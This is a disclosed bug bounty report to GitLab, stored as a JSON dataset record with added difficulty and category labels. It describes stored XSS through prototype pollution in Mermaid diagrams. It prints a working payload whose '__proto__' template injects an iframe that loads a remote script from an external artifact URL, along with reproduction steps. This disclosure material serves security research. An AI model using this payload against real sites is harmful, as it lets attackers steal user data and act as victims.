{
  "reported_to": "GitLab",
  "reported_by": "misha98857 ",
  "title": "Stored XSS via Mermaid Prototype Pollution vulnerability",
  "content": "\nSummary\nI am continue investigating #1106238 and found additional vector for prototype pollution and stored xss.\nSteps to reproduce\nCreate an issue in any repository\nCreate mermaid diagram with following payload:\nCode 497 Bytes\n1%%{init: { '__proto__': {'template': '<iframe xmlns=\\\"http://www.w3.org/1999/xhtml\\\" srcdoc=\\\"&lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js&gt; &lt;/script&gt;\\\">'}} }%%\n2%%{init: { '__proto__': {'template': '<iframe xmlns=\\\"http://www.w3.org/1999/xhtml\\\" srcdoc=\\\"&lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js&gt; &lt;/script&gt;\\\">'}} }%%\n3sequenceDiagram\n4Alice->>Bob: Hi Bob\n5Bob->>Alice: Hi Alice\nThis will pollute template attribute and, for example, if we click on the search bar after the page loaded, XSS will be executed. This still requires minimal user interaction.\nPOC\nOpen https://gitlab.com/cataha319/stored-xss/-/issues/2\nAfter page loaded, try select search menu on top bar.\n<image_0>\nWhat is the current bug behavior?\nMermaid allows setting proto attribute in the directive which leads to stored XSS.\nWhat is the expected correct behavior?\nMermaid doesn't allow proto attributed to being set in the directive and merged with the config.\nOutput of checks\nThis vulnerability was tested on gitlab.com. On a local Gitlab instance with a newer version(same as gitlab.com) of Mermaid, it works too.\nImpact\nAn attacker who can add Mermaid diagram to the page will can steal some data or make any actions as user.\n\n",
  "severity": [
    8.7,
    null
  ],
  "bounty": 3000,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fuwkh9wqnmainjja5h9100nw4gah?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2021-07-28_01-27-59.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2021-07-28_01-27-59.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCCRTJWQ%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T170455Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIF3Us%2FimESWsysen9Ra%2FZ6r1b3OeQm4bLqxTiKAz%2F5rzAiAczyHgp6ty1Maxpe7nmX0DSL8Tte3Fxypcz%2BcgLTAeVyqyBQgVEAMaDDAxMzYxOTI3NDg0OSIMGVqnhEQSgUgDGCkuKo8FHCIPPFmFvFawAa6TEe6wo7GjgEMVhjsBzdfiHlOBPBQe3l%2B05w%2BYdZJyT0Se5A4hspTCyLMxgtY5D4Q%2Bloxa%2BgruisedjtjnfkF3XkIYjMCqAyFsXiavGSCiaO3bqrpVmJsbp7AkBtu6td26Uynd7jxxj6F9FtsN1IXFJAHJTPHtNNanrFjnsyM3M271u4R315Qbhv6l31h3YfdYQBj3bKHPZjGlPqKCV0WLMDCLBp1GMtO3zVOno6CAloAoXmSiKclitoWQEYaomRiS5DeNreY5%2Fj9MzhWz1QbpPNKjjFOtedPPBXxEhykui4HSoVVJvJXyzyBtxD3QuReImQ%2FAU71u2ulXAwUCz34JgcJyTDP33ZZY1yBAj4H6cg%2B27rAPa7JIFmIa1xz59pfWc%2Foh39OUFN6H6hKytFJEQ2gwjQeMiQS6qKcmZSZHyWTKXCzdONusYCr4LbDQ4dt%2FusmjeSgu8DQk7jPy78JpPmWS44eJXI%2BeVezCGbfz2vlk%2F2iqgGNdsZp%2FIUpkq7qw%2FjkSYTLskxYpi4jpcECHiO1lDSy19kxENtSm2TDq3gyLWE5%2FpZit4zaazjbSikV7MCtquRS0xZBkwNyQwmoQRU6a6gZRjvTb73fVA1L%2FJUDzaXeApxSh%2BBTUKeT7N7HX%2FynoWChVpNjEaeIClJfBo8YYCaaNMyNtvH0NbFmXneoosivXbYLXPdMxpbAl%2Bo%2FL8EVHyRvIvdZb%2F02J4etN4TSZrny%2BQCs5LUBJd39DD%2FifwDNG%2BGi%2BJS9tlctWe7cLtSq8s%2FY39s8PLQhKrDQmcGLfXegrUuy788O5NxCM0n1hpigo6MVcBwoRtaypUdxJv5H3wdUQ17mx2KmR2%2BAOuGG8DTDOs4q%2FBjqyAdK4pe%2B9y3u3LagENYaO8cr5PWW5ErF0g2AULTtsUojqZgwUIGMYwcy7Q5gPDPck5XlpRWMcvLUegiBiySmqNRpfa1BQExsXLtQuKeKLdgDfn8%2Fztr4N8Jl1I2BBUrnvBU43oDq9FXKQ%2F56UB6iwNOUMLo15GrEnM8b5NVE0NqtKYRV5Im3GFfyE6sAluIjvxkGIJrZ5DbYTva9ipaUVdHXqVR32reQOJPQ0du3SpuDJlLI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=82f0f7771bee32ff6bdd444f4cd0738f4fa2058b4bad55e7fdcc770126342e26"
  },
  "disclosed_date": 1637218980,
  "report_url": "https://hackerone.com/reports/1280002",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Create an issue in any repository"
    ],
    [
      2,
      "Insert a Mermaid diagram with the payload that pollutes the prototype via '__proto__' attribute"
    ],
    [
      3,
      "After the page loads, interact with the search bar to trigger the XSS"
    ]
  ],
  "vuln_description": "This vulnerability involves a Stored XSS via Mermaid Prototype Pollution, where an attacker can inject malicious JavaScript through a specially crafted Mermaid diagram. The payload pollutes the prototype chain, leading to XSS execution when certain user interactions occur (like clicking the search bar).",
  "reason": "The attack requires understanding of prototype pollution in Mermaid diagrams and crafting a payload that exploits this to achieve XSS. While the concept of prototype pollution is known, applying it in this specific context with Mermaid and triggering XSS through user interaction adds complexity.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "1106238",
  "authnz_metadata": {
    "reason": "The vulnerability involves prototype pollution and stored XSS via Mermaid diagram, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing different user sessions and resource IDs for authN/authZ issues, not prototype pollution or XSS vulnerabilities.",
    "is_detectable": false
  }
}